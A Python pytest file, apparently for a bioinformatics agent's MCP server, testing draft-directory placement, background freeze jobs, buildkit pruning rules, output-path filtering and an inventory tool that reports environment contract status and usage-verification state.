        "pipelines_dir": str(reports),
        "drafts_dir": str(drafts),
    }}
    ps = PipelineState(cfg)
    ps.start("c1_test", "drafts-dir test")
    ps.patch("c1_test", {"description": "a"})
    draft_path = ps._draft_path("c1_test")
    assert draft_path.parent == drafts, (
        f"draft path was {draft_path}, expected parent dir {drafts}")
    assert draft_path.exists()
    # AND pipelines_dir (the deliverables dir) must NOT contain the draft
    pipelines_drafts = list(reports.glob("*.draft.yaml"))
    assert not pipelines_drafts, (
        f"pipelines_dir should never contain *.draft.yaml; found: "
        f"{pipelines_drafts}")


def test_pipeline_state_back_compat_uses_pipelines_dir_when_drafts_dir_unset():
    """C1 — an OLD config without `drafts_dir` falls back to pipelines_dir so a
    pre-batch-3 deployment keeps working. The fallback is what makes this a
    non-breaking change."""
    from agent.skills.pipeline_state import PipelineState
    cfg_old = {"paths": {"pipelines_dir": "env_reports"}}
    ps = PipelineState(cfg_old)
    # drafts_dir collapses to pipelines_dir
    assert ps.drafts_dir == ps.pipelines_dir


def test_pipeline_state_scans_both_dirs_for_existing_drafts(tmp_path):
    """C1 — _load_existing_drafts must scan BOTH drafts_dir AND pipelines_dir
    so an upgrade with drafts still in the old location finds them.
    Same-id wins by drafts_dir-first scan order (new location authoritative)."""
    from agent.skills.pipeline_state import PipelineState
    drafts = tmp_path / "drafts"; drafts.mkdir()
    reports = tmp_path / "reports"; reports.mkdir()
    # An old-location draft (legacy) that should still be loaded
    (reports / "legacy.draft.yaml").write_text("description: from legacy\n")
    # A new-location draft (canonical)
    (drafts / "modern.draft.yaml").write_text("description: from modern\n")
    # PipelineState computes project_root from __file__ and prefixes the cfg
    # paths to it. Absolute paths in the cfg short-circuit that prefix.
    cfg = {"paths": {
        "pipelines_dir": str(reports),
        "drafts_dir": str(drafts),
    }}
    ps = PipelineState(cfg)
    assert "legacy" in ps._drafts
    assert "modern" in ps._drafts


def test_freeze_background_writes_args_to_jobs_dir(monkeypatch, tmp_path):
    """C1 — W1 background freeze writes its args.json + result.json under
    data/jobs/ (keyed by job_id), NOT under env_reports/. Sibling of the
    JobManager log/status files for the SAME job."""
    from agent import mcp_server as ms

    started = {}
    def _stub_start(command, *, env_name="", job_id="", working_dir=""):
        started["job_id"] = job_id
        started["log_path"] = str(tmp_path / f"{job_id}.log")
        return {"job_id": job_id, "log_path": started["log_path"], "state": "running"}

    jobs_dir = tmp_path / "data" / "jobs"
    jobs_dir.mkdir(parents=True)
    monkeypatch.setattr(ms._job_manager, "start", _stub_start)
    monkeypatch.setattr(ms._job_manager, "jobs_dir", jobs_dir)
    monkeypatch.setattr(ms._env_mgr, "project_root", tmp_path)
    out = ms.freeze(env_name="bgrelocation", tools=["samtools=1.21"], background=True)
    assert out["background"] is True
    # the args file lands in data/jobs/, NOT in env_reports/
    args_files = list((tmp_path / "data" / "jobs").glob(f"{started['job_id']}.args.json"))
    assert args_files, "args.json must be in data/jobs/, not env_reports/"
    # env_reports/ must not have any W1 ephemera
    bad_args = list((tmp_path / "env_reports").glob("*.freeze_args.*.json"))
    bad_results = list((tmp_path / "env_reports").glob("*.freeze_result.json"))
    assert not bad_args and not bad_results, (
        f"env_reports/ should never see W1 ephemera; found {bad_args + bad_results}")


def test_freeze_does_not_prune_on_pre_docker_failure(monkeypatch):
    """A2 — refusals that happen BEFORE docker starts (resolve/route/
    map_install / honesty-contract) leave no buildkit layers, so the prune
    is skipped. Don't waste a `docker builder prune -af` on a no-op."""
    import agent.mcp_server as ms

    monkeypatch.setattr(ms, "_check_disk_failsafe", lambda min_gb=None: None)
    monkeypatch.setattr(ms._pipeline_state, "get_draft", lambda pid: None)
    monkeypatch.setattr(ms._freeze, "request_key", lambda *a, **kw: "rk")
    monkeypatch.setattr(ms._env_cache, "lookup_anchored", lambda rk, present: None)
    monkeypatch.setattr(ms._freeze, "compute_content_digest", lambda d: "cd")
    monkeypatch.setattr(ms._biocontainers, "resolve_biocontainer",
                        lambda parsed: {"found": False})
    monkeypatch.setattr(ms._freeze, "non_conda_installs", lambda d: [])
    monkeypatch.setattr(ms._freeze, "env_mutating_pipeline_steps", lambda d: [])
    monkeypatch.setattr(ms._freeze, "requested_conda_specs", lambda d: ["x=1"])
    # FAILURE before docker — stage is 'resolve', NOT one of the docker stages
    monkeypatch.setattr(ms._env_freeze, "build_env_image",
                        lambda *a, **kw: {"success": False, "stage": "resolve",
                                          "tool": "x", "reason": "no tier"})
    prune_called = {"count": 0}
    monkeypatch.setattr(ms, "_prune_buildkit_after_failure",
                        lambda: (prune_called.__setitem__("count", prune_called["count"] + 1)
                                 or {"attempted": True, "ok": True}))
    # even with stressed disk, a pre-docker failure should NOT prune
    import shutil
    monkeypatch.setattr(shutil, "disk_usage",
                        lambda p: type("U", (), {"free": 1 * (1024 ** 3)})())
    result = ms.freeze(env_name="t", tools=["x=1"])
    assert result["stage"] == "container_build"
    assert prune_called["count"] == 0, (
        "pre-docker failure (stage=resolve) leaves no buildkit layers — "
        "prune is a no-op and would mask the actual error in the response")
    assert "buildkit_prune" not in result


def test_requested_conda_specs_unversioned_name_preserved():
    """R6 — the unversioned form is preserved (the agent declared
    `install_conda_packages(env, [{spec: 'samtools'}])` without pinning).
    The engine resolves the version; the cache key picks up the install-
    record-filled version at request_key time (B7 already handles that)."""
    from agent.skills.freeze import requested_conda_specs
    draft = {"install_steps": [
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "installed_packages": [{"name": "samtools"}]},
    ]}
    specs = requested_conda_specs(draft)
    assert specs == ["samtools"]


# =============================================================================
# Batch-3 Apollo3 followup (2026-05-27) — C7: N7 + N8 step-output hygiene
# =============================================================================


def test_diff_snapshot_excludes_paths_outside_project_root(tmp_path):
    """N7 (batch-3) — when watch_dir is a system-shared location (e.g. /tmp),
    `_diff_snapshot` must filter to paths that resolve UNDER project_root.
    Pre-fix the snapshot included files from other processes / symlinked
    workspaces (the Apollo3 stress hit the Claude harness's subagent
    transcript dir via a symlink resolution in /tmp)."""
    from agent.skills.env_manager import EnvManager
    # Two trees: a 'project_root' and a 'shared_tmp' (the watch_dir)
    project = tmp_path / "project"
    shared = tmp_path / "shared"
    outside = tmp_path / "outside"
    for d in (project, shared, outside):
        d.mkdir()
    # A NEW file in shared/ that lives inside project — KEEP
    project_file = project / "step_output.bam"
    project_file.write_text("inside")
    project_link = shared / "step_output.bam"
    project_link.symlink_to(project_file)
    # A NEW file in shared/ that resolves OUTSIDE project — DROP
    outside_file = outside / "transcript.jsonl"
    outside_file.write_text("foreign")
    outside_link = shared / "transcript.jsonl"
    outside_link.symlink_to(outside_file)

    before = {}    # empty snapshot — every file is "new"
    detected = EnvManager._diff_snapshot(before, shared, project_root=project)
    # the symlink resolving INTO project survives the filter
    assert any("step_output.bam" in p for p in detected)
    # the symlink resolving OUTSIDE project does NOT
    assert not any("transcript.jsonl" in p for p in detected), (
        f"foreign file leaked into detected_outputs: {detected}")


def test_diff_snapshot_no_filter_when_watch_dir_inside_project(tmp_path):
    """N7 (regression) — a watch_dir INSIDE the project must NOT be filtered.
    Every produced file under, e.g., `data/some_pipeline_test_data/` is by
    construction a project file; the filter only fires for system-shared
    watches like /tmp."""
    from agent.skills.env_manager import EnvManager
    project = tmp_path / "project"
    sub = project / "data" / "step_output"
    sub.mkdir(parents=True)
    f = sub / "out.bam"
    f.write_text("x")
    before = {}
    # watch_dir is project_root or inside it → filter is a no-op
    detected = EnvManager._diff_snapshot(before, sub, project_root=project)
    assert any("out.bam" in p for p in detected)


def test_diff_snapshot_no_project_root_falls_back_to_old_behavior(tmp_path):
    """N7 (back-compat) — calling _diff_snapshot without project_root keeps
    the pre-batch-3 behavior (no filter). Any code path that doesn't pass
    project_root keeps working."""
    from agent.skills.env_manager import EnvManager
    d = tmp_path / "watch"
    d.mkdir()
    (d / "any.txt").write_text("x")
    detected = EnvManager._diff_snapshot({}, d)   # no project_root kwarg
    assert any("any.txt" in p for p in detected)


def test_run_pipeline_step_output_types_accepts_full_path_keys(monkeypatch, tmp_path):
    """N8 (batch-3) — `output_types={'/abs/path.log': 'txt'}` must match the
    detected output keyed by absolute path. Pre-fix only basename/extension
    keys worked, so a full-path key silently fell through to extension
    inference (yielding expected_type='any' → I3 violation at seal)."""
    import agent.mcp_server as ms

    # Stub run_in_env to return one detected output at an absolute path
    from pathlib import Path as _Path
    out_path = str(tmp_path / "step.custom_ext")
    _Path(out_path).write_text("data")

    def fake_run(env_name, command, *, timeout=0, inputs=None, watch_dir=None):
        return {
            "returncode": 0, "stdout": "", "stderr": "", "success": True,
            "command": command, "runtime_seconds": 0.1,
            "resource_usage": {}, "inputs": inputs or [],
            "detected_outputs": [out_path],
        }
    monkeypatch.setattr(ms._env_mgr, "run_in_env", fake_run)

    # Stub validator + pipeline_state to capture the etype that was passed
    seen = {}
    monkeypatch.setattr(ms._validator, "validate",
                        lambda path, etype, env_name="": (seen.__setitem__("etype", etype)
                                                          or {"passed": True}))
    monkeypatch.setattr(ms._pipeline_state, "add_step", lambda *a, **kw: 1)
    monkeypatch.setattr(ms._pipeline_state, "add_validation", lambda *a, **kw: None)

    # Key by full absolute path — this is what an agent naturally reaches for
    result = ms.run_pipeline_step(
        env_name="x", command="touch step.custom_ext", pipeline_id="p",
        output_types={out_path: "txt"},
    )
    assert result["validation_count"] == 1
    assert seen["etype"] == "txt", (
        f"output_types full-path key did not bind; etype was {seen['etype']!r}")
    assert result.get("output_types_unmatched", []) == []


def test_run_pipeline_step_output_types_reports_unmatched_keys(monkeypatch, tmp_path):
    """N8 (defense-in-depth) — keys that didn't bind to any detected output
    come back in `output_types_unmatched`. Typos and 'I asked for that file
    but the command didn't produce it' show up explicitly instead of silently
    becoming expected_type='any'."""
    import agent.mcp_server as ms

    from pathlib import Path as _Path
    out_path = str(tmp_path / "produced.bam")
    _Path(out_path).write_text("x")

    def fake_run(env_name, command, *, timeout=0, inputs=None, watch_dir=None):
        return {"returncode": 0, "stdout": "", "stderr": "", "success": True,
                "command": command, "runtime_seconds": 0.1,
                "resource_usage": {}, "inputs": inputs or [],
                "detected_outputs": [out_path]}
    monkeypatch.setattr(ms._env_mgr, "run_in_env", fake_run)
    monkeypatch.setattr(ms._validator, "validate",
                        lambda path, etype, env_name="": {"passed": True})
    monkeypatch.setattr(ms._pipeline_state, "add_step", lambda *a, **kw: 1)
    monkeypatch.setattr(ms._pipeline_state, "add_validation", lambda *a, **kw: None)

    result = ms.run_pipeline_step(
        env_name="x", command="touch produced.bam", pipeline_id="p",
        output_types={".bam": "bam", "expected_but_not_produced.vcf": "vcf"},
    )
    assert "expected_but_not_produced.vcf" in result.get("output_types_unmatched", [])
    # The matched key is NOT in unmatched
    assert ".bam" not in result.get("output_types_unmatched", [])


def test_run_pipeline_step_output_types_lookup_order(monkeypatch, tmp_path):
    """N8 — most-specific-wins lookup. When the agent supplies BOTH a
    full-path key AND a generic .bam key, the full-path key wins (more
    specific). Documented in the docstring."""
    import agent.mcp_server as ms

    from pathlib import Path as _Path
    out_path = str(tmp_path / "out.bam")
    _Path(out_path).write_text("x")

    def fake_run(*a, **kw):
        return {"returncode": 0, "detected_outputs": [out_path],
                "inputs": [], "resource_usage": {}, "runtime_seconds": 0.1,
                "success": True, "stdout": "", "stderr": "", "command": kw.get("command", "")}
    monkeypatch.setattr(ms._env_mgr, "run_in_env", fake_run)
    seen = {}
    monkeypatch.setattr(ms._validator, "validate",
                        lambda path, etype, env_name="": (seen.__setitem__("etype", etype)
                                                          or {"passed": True}))
    monkeypatch.setattr(ms._pipeline_state, "add_step", lambda *a, **kw: 1)
    monkeypatch.setattr(ms._pipeline_state, "add_validation", lambda *a, **kw: None)

    result = ms.run_pipeline_step(
        env_name="x", command="touch out.bam", pipeline_id="p",
        output_types={out_path: "specific", ".bam": "generic"},
    )
    # Full-path key wins
    assert seen["etype"] == "specific"
    # The generic key remains unused
    assert result.get("output_types_unmatched") == [".bam"]


# ---------------------------------------------------------------------------
# list_installed_pipelines — the "what have I already built?" inventory
# ---------------------------------------------------------------------------

def test_list_pipelines_reports_both_layers_from_the_artifacts_that_exist(tmp_path):
    """The inventory must read the artifacts the runtime ACTUALLY writes.

    It used to parse every *.yaml in env_reports/ as a `PipelineSpec` — a model
    whose producers (finalize_pipeline / save_pipeline_spec) were retired in the
    re-spine. So it matched only WorkflowSpec/recipe yamls, every parse raised,
    a try/except turned each into an {file, error} dict, and the tool returned
    `count: 7` having understood NONE of them. Broken for a real user, green in
    the suite — the audit's disease in a user-facing MCP tool."""
    import yaml
    from agent.skills.resources import list_pipelines
    from agent.skills.freeze import EnvCache
    from env_records import env_record

    (tmp_path / "demo.workflow.yaml").write_text(yaml.safe_dump({
        "workflow_name": "demo", "description": "d", "created_at": "2026-01-01",
        "env_request_key": "samtools=1.21|linux/amd64|none",
        "env_content_digest": "sha256:" + "a" * 64, "env_image": "demo:1.0",
        "validated_in_shipped_image": True, "usage_verified": True,
        "pipeline_steps": [{"step": 1, "validation_status": "passed"},
                           {"step": 2, "validation_status": "failed"}],
    }))
    # a recipe yaml sits in the same dir and must NOT be mistaken for a workflow
    (tmp_path / "demo.recipe.yaml").write_text(yaml.safe_dump({"name": "demo"}))

    cache = EnvCache(tmp_path / "_env_cache.json")
    cache.register("samtools=1.21|linux/amd64|none",
                   env_record(name="demo", requested_tools=["samtools=1.21"],
                              resolved_packages=[{"name": "samtools", "version": "1.21"}]))

    # detail=True: this test is about the FULL record — the per-tool requested/installed
    # /diverges shape and the legacy `usage_verified` bool. The compact default has its
    # own contract, covered in tests/test_inventory_is_compact.py (which checks that a
    # DIVERGENCE and a contract violation survive compaction, since those are the two
    # things a smaller payload must never quietly drop).
    r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}}, env_cache=cache,
                       detail=True)

    assert r["counts"] == {"envs": 1, "envs_contract_ok": 1, "workflows": 1}
    # Layer 1 — the frozen env, with a HUMAN-READABLE version off the SBOM. Each tool
    # carries requested vs OBSERVED-installed + a divergence flag (audit 2026-07-19,
    # W5/W6); `version` is kept as a back-compat alias for `installed`.
    (env,) = r["envs"]
    assert env["tools"] == [{"tool": "samtools", "requested": "1.21",
                             "installed": "1.21", "version": "1.21", "diverges": False}]
    assert env["contract_ok"] is True and env["contract_violations"] == []
    # Layer 2 — the sealed workflow, counted honestly (1 of 2 steps validated)
    (wf,) = r["workflows"]
    assert wf["workflow_name"] == "demo"
    assert (wf["steps_total"], wf["steps_validated"]) == (2, 1)
    assert wf["validated_in_shipped_image"] is True and wf["usage_verified"] is True


def test_list_pipelines_reports_the_three_state_usage_not_a_bare_bool(tmp_path):
    """The inventory row must distinguish "never tested" from "tested and failed".

    `usage_verified: false` conflates them, and because seal REFUSES a real I4 failure,
    false on disk always meant the former — a verdict nobody reached, reported as one.
    This row sat directly beneath the envs[] half that RE-EARNS its contract coverage,
    so the same listing was rigorous about Layer 1 and credulous about Layer 2.

    Both fixtures below carry `usage_verified: false`; only the three-state field tells
    them apart, which is the whole point."""
    import yaml
    from agent.skills.resources import list_pipelines
    from agent.skills.freeze import EnvCache

    def _spec(name, uv):
        d = {"workflow_name": name, "description": "d", "created_at": "2026-01-01",
             "env_request_key": "", "usage_verified": False,
             "pipeline_steps": [{"step": 1, "validation_status": "passed"}]}
        if uv is not None:
            d["usage_verification"] = uv
        return d

    (tmp_path / "never.workflow.yaml").write_text(yaml.safe_dump(_spec(
        "never", {"status": "not_attempted", "reason": "inputs live on the cluster"})))
    (tmp_path / "ran.workflow.yaml").write_text(yaml.safe_dump(_spec(
        "ran", {"status": "verified", "reason": ""})))
    # An artifact sealed BEFORE the field existed: the honest read is `unrecorded`, never a
    # fabricated False the producer never wrote — and, since 2026-08-06, never
    # `not_attempted` either. That was this test's original expectation and it was wrong in
    # the same shape as the bool it replaced, one step further along: `not_attempted` is a
    # FINDING ("the self-test did not run"), asserted here about a spec whose producer
    # recorded nothing at all. Measured on disk: 4 of 7 sealed specs are in this state, and
    # one of them is a multi-ENV chain whose how-to is structurally unprovable — the honest
    # `degraded(seal.sealed_howto_unproven)` landing — which a reader could not tell apart
    # from a workflow where nobody bothered to author one. That is the exact distinction the
    # three-state field was introduced to draw, lost again at the fallback.
    (tmp_path / "legacy.workflow.yaml").write_text(yaml.safe_dump(_spec("legacy", None)))

    # Checked in BOTH forms. This is the highest-value property in the row, and adding a
    # second rendering of the row is a fresh chance to lose it in one of them — which is
    # exactly how `steps_validated` ended up correct in six places and inverted in the
    # seventh.
    for detail in (False, True):
        r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}},
                           env_cache=EnvCache(tmp_path / "_env_cache.json"),
                           detail=detail)
        rows = {w["workflow_name"]: w for w in r["workflows"]}

        assert rows["never"]["usage_verification_status"] == "not_attempted", detail
        assert "cluster" in rows["never"]["usage_verification_reason"], detail
        assert rows["ran"]["usage_verification_status"] == "verified", detail
        assert rows["legacy"]["usage_verification_status"] == "unrecorded", detail

    # ...and the bare bool genuinely cannot tell the first two apart, which is why the
    # field above has to exist rather than the reader being told to be careful. Only the
    # detail form still carries it.
    r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}},
                       env_cache=EnvCache(tmp_path / "_env_cache.json"), detail=True)
    rows = {w["workflow_name"]: w for w in r["workflows"]}
    assert rows["never"]["usage_verified"] == rows["ran"]["usage_verified"] is False


def test_list_pipelines_counts_the_NORMAL_validation_shape_not_only_the_override(tmp_path):
    """`steps_validated` must count per-file `validation` records, not just the override.

    Found on a live cluster drive, not by the suite: every sealed workflow in the repo
    reported `steps_validated: 0`, including a five-step run whose every step carried a
    complete set of passing `validate_output` records. The row read only
    `validation_status == "passed"` — the NARROW `mark_step_validated` override — so it
    counted a step as validated exactly when the agent had asserted it and never when
    the runtime had observed it. Precisely inverted, and advertised in the tool's own
    description.

    The two tests above did not catch it because both build steps out of
    `validation_status`, the shape almost no real step has. A fixture that avoids the
    defect is why the defect shipped, so this one uses the shape the runtime writes.
    """
    import yaml
    from agent.skills.resources import list_pipelines
    from agent.skills.freeze import EnvCache

    (tmp_path / "mixed.workflow.yaml").write_text(yaml.safe_dump({
        "workflow_name": "mixed", "description": "d", "created_at": "2026-01-01",
        "env_request_key": "", "pipeline_steps": [
            # what run_pipeline_step / run_step_in_container / run_step_on_cluster write
            {"step": 1, "returncode": 0,
             "validation": {"a.bam": {"passed": True, "validation_method": "samtools"}}},
            # the narrow agent-asserted override
            {"step": 2, "returncode": 0, "validation_status": "passed"},
            # ran, produced nothing anyone checked
            {"step": 3, "returncode": 0},
        ],
    }))

    r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}},
                       env_cache=EnvCache(tmp_path / "_env_cache.json"))
    (wf,) = r["workflows"]
    assert (wf["steps_total"], wf["steps_validated"]) == (3, 2)


def test_list_pipelines_never_contradicts_its_own_usage_bool(tmp_path):
    """One row must not print `usage_verified: true` beside `status: not_attempted`.

    A spec sealed before `usage_verification` existed carries only the bool. Deriving
    the status locally here — rather than through `core_data.usage_status`, which falls
    back to that bool — made this row a THIRD reading of one field, and it disagreed
    with the bool printed two lines above it. `samtools_cluster_rung3.workflow.yaml` is
    that artifact on disk, and the contradiction was visible in a live inventory call.
    """
    import yaml
    from agent.skills.resources import list_pipelines
    from agent.skills.freeze import EnvCache

    (tmp_path / "legacyok.workflow.yaml").write_text(yaml.safe_dump({
        "workflow_name": "legacyok", "description": "d", "created_at": "2026-01-01",
        "env_request_key": "", "usage_verified": True,   # ...and NO usage_verification
        "pipeline_steps": [{"step": 1, "returncode": 0,
                            "validation": {"a.tsv": {"passed": True}}}],
    }))

    # detail=True, because the contradiction being guarded is between the legacy bool
    # and the status, and the COMPACT row does not carry the bool at all. That is the
    # stronger position — a field with two readings cannot disagree with itself if only
    # the unambiguous one ships — but it means the contradiction can only be reproduced
    # here, where both are present.
    r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}},
                       env_cache=EnvCache(tmp_path / "_env_cache.json"), detail=True)
    (wf,) = r["workflows"]
    assert wf["usage_verified"] is True
    assert wf["usage_verification_status"] == "verified"

    compact = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}},
                             env_cache=EnvCache(tmp_path / "_env_cache.json"))
    (cwf,) = compact["workflows"]
    assert cwf["usage_verification_status"] == "verified"
    assert "usage_verified" not in cwf, (
        "the compact row must ship the three-state verdict ONLY — carrying the "
        "two-states-in-one bool alongside it is how the contradiction happened")


def test_list_pipelines_marks_an_env_that_would_be_REFUSED_today(tmp_path):
    """`contract_ok` is EARNED at read time, not remembered from freeze time.

    An inventory is a serving path like any other: if it lists a record the
    runtime would refuse, it hands the reader a false green — the exact hole
    tier 5 closed for the cache. So the listing asks the same question
    (env_honesty.check_build) the serving paths ask, and says so when the answer
    is no. This is what lets a STRENGTHENED gate reach artifacts frozen before it
    existed, instead of grandfathering them."""
    from agent.skills.resources import list_pipelines
    from agent.skills.freeze import EnvCache
    from env_records import env_record

    cache = EnvCache(tmp_path / "_env_cache.json")
    # bypass register()'s own gate to plant a record that can no longer earn its green
    # (exactly what a pre-tier-2 samtools record looked like: no in-image evidence)
    cache._save({"stale=1.0|linux/amd64|none":
                 env_record(name="stale", verifications=[])})

    r = list_pipelines({"paths": {"pipelines_dir": str(tmp_path)}}, env_cache=cache)
    (env,) = r["envs"]
    assert env["contract_ok"] is False, "a record failing check_build must not read as usable"
    assert env["contract_violations"], "the failing clause must be NAMED, not just flagged"
    assert r["counts"]["envs"] == 1 and r["counts"]["envs_contract_ok"] == 0


def test_an_unpinned_request_discloses_that_a_cache_hit_is_a_reuse():
    """An unpinned tool makes the request_key ambiguous, so a hit is a REUSE.

    `_resolve_versions_from_install_record` fills a version from the install record,
    which is what stopped busco 6.0.0 and 5.8.3 colliding. It cannot fill what was
    never recorded — `run_install_command` derives no version — so the bare name
    reaches request_key and two versions produce ONE key. Measured at HEAD.

    Not a refusal: the artifact is honest (the record carries the OBSERVED version and
    the ENV report renders it). What was missing is a word at the CALL."""
    from agent.skills.freeze import request_key
    import agent.mcp_server as ms

    def draft_without_version(ver):
        return {"install_steps": [{"tool": "pip", "returncode": 0,
                                   "command": f"pip install busco=={ver}",
                                   "installed_packages": [{"name": "busco"}]}]}

    keys = {request_key(ms._resolve_versions_from_install_record(
                [("busco", None)], draft_without_version(v)), "linux/amd64")
            for v in ("6.0.0", "3.0.2")}
    assert len(keys) == 1, "precondition: this is the collision being disclosed"
    assert keys == {"busco|linux/amd64|none"}

    # ...and when the version IS recorded, the two do not collide and nothing is disclosed.
    def draft_with_version(ver):
        return {"install_steps": [{"tool": "pip", "returncode": 0,
                                   "command": f"pip install busco=={ver}",
                                   "installed_packages": [{"name": "busco", "version": ver,
                                                           "install_method": {"type": "pip"}}]}]}
    pinned = {request_key(ms._resolve_versions_from_install_record(
                  [("busco", None)], draft_with_version(v)), "linux/amd64")
              for v in ("6.0.0", "3.0.2")}
    assert len(pinned) == 2, "a recorded version must keep the two artifacts apart"
